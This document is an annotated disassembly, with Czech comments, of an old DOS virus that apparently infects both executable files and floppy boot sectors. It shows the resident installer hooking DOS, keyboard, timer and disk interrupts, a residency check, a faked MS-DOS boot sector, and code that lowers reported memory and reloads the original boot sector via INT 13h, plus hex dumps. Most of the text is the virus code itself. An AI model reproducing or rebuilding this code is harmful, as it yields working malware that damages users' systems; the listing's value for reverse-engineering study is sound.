; ZDE POKRACUJEME PO RETF (C62) + pocatek pro EXE
;
AX=0006  BX=0B63  CX=1006  DX=0000  SP=0DEE  BP=0000  SI=0000  DI=0000
DS=48C5  ES=48C5  SS=CS  CS=CS  IP=0B63   NV UP EI PL NZ NA PO NC

0B63 FC             CLD
0B64 06             PUSH   ES
0B65 E856FF         CALL   0ABE           (procedura BBE)
0B68 2E8C061600     MOV    CS:[0016],ES
0B6D 2E8C067400     MOV    CS:[0074],ES
0B72 2E8C067800     MOV    CS:[0078],ES
0B77 2E8C067C00     MOV    CS:[007C],ES
0B7C 8CC3           MOV    BX,ES
0B7E 83C310         ADD    BX,+10
0B81 2E011EA80B     ADD    CS:[0BA8],BX
0B86 2E011E4200     ADD    CS:[0042],BX
0B8B B3FF           MOV    BL,FF
0B8D B84342         MOV    AX,4243
0B90 CD21           INT    21
0B92 3D7856         CMP    AX,5678
0B95 7513           JNZ    0BAA
0B97 07             POP    ES
0B98 2E8E164200     MOV    SS,CS:[0042]
0B9D 2E8B264000     MOV    SP,CS:[0040]
0BA2 E8A8FE         CALL   0A4D
0BA5 EA20202020     JMP    2020:2020
0BAA E87DFE         CALL   0A2A
0BAD E8AEFE         CALL   0A5E
0BB0 33C0           XOR    AX,AX
0BB2 8EC0           MOV    ES,AX
0BB4 26A1F003       MOV    AX,ES:[03F0]
0BB8 2EA31800       MOV    CS:[0018],AX
0BBC 26A0F203       MOV    AL,ES:[03F2]
0BC0 2EA21A00       MOV    CS:[001A],AL
0BC4 26C706F003F3A5 MOV    Word Ptr ES:[03F0],A5F3  ; 0:3F0 F3 A5  REPZ MOVSW
0BCB 26C606F203CB   MOV    Byte Ptr ES:[03F2],CB    ; 0:3F2 CB          RETF
0BD1 58             POP    AX
0BD2 051000         ADD    AX,0010
0BD5 8EC0           MOV    ES,AX
0BD7 0E             PUSH   CS
0BD8 1F             POP    DS
0BD9 B90010         MOV    CX,1000
0BDC D1E9           SHR    CX,1
0BDE 33F6           XOR    SI,SI
0BE0 8BFE           MOV    DI,SI
0BE2 06             PUSH   ES
0BE3 B8EC0B         MOV    AX,0BEC
0BE6 50             PUSH   AX
0BE7 EAF0030000     JMP    0000:03F0

AX=0BEC  BX=0E1A  CX=0800  DX=2D4C  SP=0DEA  BP=0000  SI=0000  DI=0000
DS=  CS  ES=  CS  SS=  CS  CS=  CS  IP=0BE7   NV UP EI PL ZR NA PE NC
;---------------------------------------------------------------------
0BEC 8CC8           MOV    AX,CS
0BEE 8ED0           MOV    SS,AX
0BF0 BCEE0D         MOV    SP,0DEE
0BF3 33C0           XOR    AX,AX
0BF5 8ED8           MOV    DS,AX
0BF7 2EA11800       MOV    AX,CS:[0018]
0BFB A3F003         MOV    [03F0],AX
0BFE 2EA01A00       MOV    AL,CS:[001A]
0C02 A2F203         MOV    [03F2],AL
0C05 BB0010         MOV    BX,1000
0C08 B104           MOV    CL,04
0C0A D3EB           SHR    BX,CL
0C0C 83C340         ADD    BX,+40
0C0F B44A           MOV    AH,4A          ; modifikuj alokovanou pamet
0C11 2E8E061600     MOV    ES,CS:[0016]
0C16 CD21           INT    21
0C18 B82135         MOV    AX,3521
0C1B CD21           INT    21
0C1D 2E891EC506     MOV    CS:[06C5],BX
0C22 2E8C06C706     MOV    CS:[06C7],ES
0C27 0E             PUSH   CS
0C28 1F             POP    DS
0C29 BA9A06         MOV    DX,069A
0C2C B82125         MOV    AX,2521
0C2F CD21           INT    21
0C31 8E061600       MOV    ES,[0016]
0C35 268E062C00     MOV    ES,ES:[002C]
0C3A 33FF           XOR    DI,DI
0C3C B9FF7F         MOV    CX,7FFF
0C3F 32C0           XOR    AL,AL
0C41 F2AE     REPNZ SCASB
0C43 263805         CMP    ES:[DI],AL
0C46 E0F9           LOOPNZ 0C41
0C48 8BD7           MOV    DX,DI
0C4A 83C203         ADD    DX,+03
0C4D B8004B         MOV    AX,4B00
0C50 06             PUSH   ES
0C51 1F             POP    DS
0C52 0E             PUSH   CS
0C53 07             POP    ES
0C54 BB7000         MOV    BX,0070
0C57 1E             PUSH   DS
0C58 06             PUSH   ES
0C59 50             PUSH   AX
0C5A 53             PUSH   BX
0C5B 51             PUSH   CX
0C5C 52             PUSH   DX
0C5D 0E             PUSH   CS
0C5E 1F             POP    DS
0C5F B80835         MOV    AX,3508
0C62 CD21           INT    21
0C64 891ED902       MOV    [02D9],BX
0C68 8C06DB02       MOV    [02DB],ES
0C6C BAB302         MOV    DX,02B3
0C6F B80825         MOV    AX,2508
0C72 CD21           INT    21
0C74 B80935         MOV    AX,3509
0C77 CD21           INT    21
0C79 891EBA03       MOV    [03BA],BX
0C7D 8C06BC03       MOV    [03BC],ES
0C81 BA7303         MOV    DX,0373
0C84 B80925         MOV    AX,2509
0C87 CD21           INT    21
0C89 B81335         MOV    AX,3513
0C8C CD21           INT    21
0C8E 891E3406       MOV    [0634],BX
0C92 8C063606       MOV    [0636],ES
0C96 BAF004         MOV    DX,04F0
0C99 B81325         MOV    AX,2513
0C9C CD21           INT    21
0C9E 5A             POP    DX
0C9F 59             POP    CX
0CA0 5B             POP    BX
0CA1 58             POP    AX
0CA2 07             POP    ES
0CA3 1F             POP    DS
0CA4 9C             PUSHF
0CA5 2EFF1EC506     CALL   FAR CS:[06C5]
0CAA 1E             PUSH   DS
0CAB 07             POP    ES
0CAC B449           MOV    AH,49
0CAE CD21           INT    21
0CB0 B44D           MOV    AH,4D
0CB2 CD21           INT    21
0CB4 B431           MOV    AH,31
0CB6 BA0010         MOV    DX,1000
0CB9 B104           MOV    CL,04
0CBB D3EA           SHR    DX,CL
0CBD 83C240         ADD    DX,+40
0CC0 CD21           INT    21

0CC0        00 00 00 00 00 00-00 00 00 00 00 00 00 00
0CD0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00
         .
         .
         .
0DB0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00
0DC0  00 00 00 00 00 00 F0 0C-FF 48 C5 48 57 18 06 00  ......p..HEHW...
0DD0  C5 48 00 00 00 00 C5 48-D5 48 00 00 EC 0B 59 09  EH....EHUH..l.Y.
0DE0  EC 0B 00 00 EC 0B 00 00-EC 0B D5 48 C0 3F 40 00  l...l...l.UH@?@.
0DF0  F5 19 73 0A F5 19 46 02-22 15 EC 0B 32 15 00 00  u.s.u.F.".l.2...

;===========================================================================
; BOOT virus
;
0000 E99C00         JMP    009F

0000  E9 9C 00 4D 53 44 4F 53-34 2E 30 00 02 01 01 00  i..MSDOS4.0.....
0010  02 E0 00 40 0B F0 09 00-12 00 02 00 00 00 00 00  .`.@.p..........
0020  00 00 00 00 00 00 29 DC-49 4F 20 20 20 20 20 20  ......)\IO
0030  53 59 53 4D 53 44 4F 53-20 20 20 53 59 53 CB 3C  SYSMSDOS   SYSK<
0040  FE FF FE FF 07 00 80 00-4E 6F 6E 2D 73 79 73 74  ~.~.....Non-syst
0050  65 6D 20 64 69 73 6B 20-6F 72 20 64 69 73 6B 20  em disk or disk
0060  65 72 72 6F 72 2E 0A 0D-52 65 70 6C 61 63 65 20  error...Replace
0070  61 6E 64 20 73 74 72 69-6B 65 20 61 6E 79 20 6B  and strike any k
0080  65 79 20 77 68 65 6E 20-72 65 61 64 79 44 69 73  ey when readyDis
0090  6B 20 62 6F 6F 74 20 66-61 69 6C 75 72 65 2E     k boot failure.

009F B8006E         MOV    AX,6E00
00A2 B104           MOV    CL,04
00A4 D3E8           SHR    AX,CL
00A6 8CC9           MOV    CX,CS
00A8 03C1           ADD    AX,CX
00AA 8ED8           MOV    DS,AX
00AC 8EC0           MOV    ES,AX
00AE 8ED1           MOV    SS,CX
00B0 BCF0FF         MOV    SP,FFF0
00B3 1E             PUSH   DS
00B4 B8B90E         MOV    AX,0EB9
00B7 50             PUSH   AX
00B8 CB             RETF

;=======================================================================
; pokracovani po RETF - kod souvisly, zmena CS
;
0EB9 8816460E       MOV    [0E46],DL
0EBD 33C0           XOR    AX,AX
0EBF 8ED8           MOV    DS,AX
0EC1 A11304         MOV    AX,[0413]   ; velikost pameti v kB
0EC4 B106           MOV    CL,06
0EC6 D3E0           SHL    AX,CL
0EC8 8ED8           MOV    DS,AX       ; prepocet na paragrafy
0ECA 833E400EFE     CMP    Word Ptr [0E40],-02
0ECF 751A           JNZ    0EEB
0ED1 B8520F         MOV    AX,0F52
0ED4 1E             PUSH   DS
0ED5 50             PUSH   AX
0ED6 1E             PUSH   DS
0ED7 07             POP    ES
0ED8 BF000E         MOV    DI,0E00
0EDB 33C0           XOR    AX,AX
0EDD 8ED8           MOV    DS,AX
0EDF BE007C         MOV    SI,7C00
0EE2 B94000         MOV    CX,0040
0EE5 FA             CLI
0EE6 FC             CLD
0EE7 F3A4      REPZ MOVSB
0EE9 FB             STI
0EEA CB             RETF

0EEB 33C0           XOR    AX,AX
0EED 8ED8           MOV    DS,AX
0EEF A11304         MOV    AX,[0413]
0EF2 2D0500         SUB    AX,0005
0EF5 A31304         MOV    [0413],AX
0EF8 B106           MOV    CL,06
0EFA D3E0           SHL    AX,CL
0EFC 8ED8           MOV    DS,AX
0EFE 8EC0           MOV    ES,AX
0F00 2E8B16460E     MOV    DX,CS:[0E46]
0F05 33DB           XOR    BX,BX
0F07 2E8B0E440E     MOV    CX,CS:[0E44]
0F0C B80802         MOV    AX,0208
0F0F E8C800         CALL   0FDA
0F12 1E             PUSH   DS
0F13 B8180F         MOV    AX,0F18
0F16 50             PUSH   AX
0F17 CB             RETF

0F18 8816460E       MOV    [0E46],DL
0F1C 33C0           XOR    AX,AX
0F1E 8ED8           MOV    DS,AX
0F20 0E             PUSH   CS
0F21 07             POP    ES
0F22 E839FB         CALL   0A5E
0F25 2EC606740F00   MOV    Byte Ptr CS:[0F74],00
0F2B 90             NOP
0F2C 8CC9           MOV    CX,CS
0F2E BFD902         MOV    DI,02D9    ; definice preruseni  8
0F31 BE2000         MOV    SI,0020
0F34 BA750F         MOV    DX,0F75
0F37 E88500         CALL   0FBF
0F3A BE2400         MOV    SI,0024    ; definice preruseni  9
0F3D BFBA03         MOV    DI,03BA
0F40 BA7303         MOV    DX,0373
0F43 E87900         CALL   0FBF
0F46 BE4C00         MOV    SI,004C    ; definice preruseni 13
0F49 BF3406         MOV    DI,0634
0F4C BAF004         MOV    DX,04F0
0F4F E86D00         CALL   0FBF
0F52 1E             PUSH   DS
0F53 07             POP    ES
0F54 C7068400FFFF   MOV    Word Ptr [0084],FFFF
0F5A BB007C         MOV    BX,7C00
0F5D 2E8B0E440E     MOV    CX,CS:[0E44]
0F62 80C108         ADD    CL,08
0F65 2E8B16460E     MOV    DX,CS:[0E46]
0F6A B80102         MOV    AX,0201
0F6D E86A00         CALL   0FDA
0F70 1E             PUSH   DS
0F71 53             PUSH   BX
0F72 CB             RETF

0F73 00 01

0F75 FA             CLI
0F76 2E803E740F00   CMP    Byte Ptr CS:[0F74],00
0F7C 7404           JZ     0F82
0F7E E932F3         JMP    02B3

0F82 1E             PUSH   DS
0F83 06             PUSH   ES
0F84 50             PUSH   AX
0F85 53             PUSH   BX
0F86 51             PUSH   CX
0F87 52             PUSH   DX
0F88 56             PUSH   SI
0F89 57             PUSH   DI
0F8A 33C0           XOR    AX,AX
0F8C 8ED8           MOV    DS,AX
0F8E A18400         MOV    AX,[0084]
0F91 3DFFFF         CMP    AX,FFFF
0F94 741E           JZ     0FB4
0F96 2E8006730F02   ADD    Byte Ptr CS:[0F73],02
0F9C 7316           JNB    0FB4
0F9E 2EC606740F01   MOV    Byte Ptr CS:[0F74],01
0FA4 0E             PUSH   CS
0FA5 07             POP    ES
0FA6 BE8400         MOV    SI,0084
0FA9 BFC506         MOV    DI,06C5
0FAC 8CC9           MOV    CX,CS
0FAE BA9A06         MOV    DX,069A
0FB1 E80B00         CALL   0FBF
0FB4 5F             POP    DI
0FB5 5E             POP    SI
0FB6 5A             POP    DX
0FB7 59             POP    CX
0FB8 5B             POP    BX
0FB9 58             POP    AX
0FBA 07             POP    ES
0FBB 1F             POP    DS
0FBC E919F3         JMP    02D8

0FBF 1E             PUSH   DS
0FC0 50             PUSH   AX
0FC1 33C0           XOR    AX,AX
0FC3 8ED8           MOV    DS,AX
0FC5 58             POP    AX
0FC6 51             PUSH   CX
0FC7 FC             CLD
0FC8 B90200         MOV    CX,0002
0FCB F3A5      REPZ MOVSW
0FCD 59             POP    CX
0FCE 83EE04         SUB    SI,+04
0FD1 FA             CLI
0FD2 8914           MOV    [SI],DX
0FD4 894C02         MOV    [SI+02],CX
0FD7 FB             STI
0FD8 1F             POP    DS
0FD9 C3             RET

0FDA 56             PUSH   SI
0FDB 8BF0           MOV    SI,AX
0FDD CD13           INT    13
0FDF 7308           JNB    0FE9
0FE1 B400           MOV    AH,00
0FE3 CD13           INT    13
0FE5 8BC6           MOV    AX,SI
0FE7 EBF4           JMP    0FDD
0FE9 5E             POP    SI
0FEA C3             RET

0FE0  08 B4 00 CD 13 8B C6 EB-F4 5E C3 00 00 00 00 00  .4.M..Fkt^C.....
0FF0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 55 AA  ..............U*
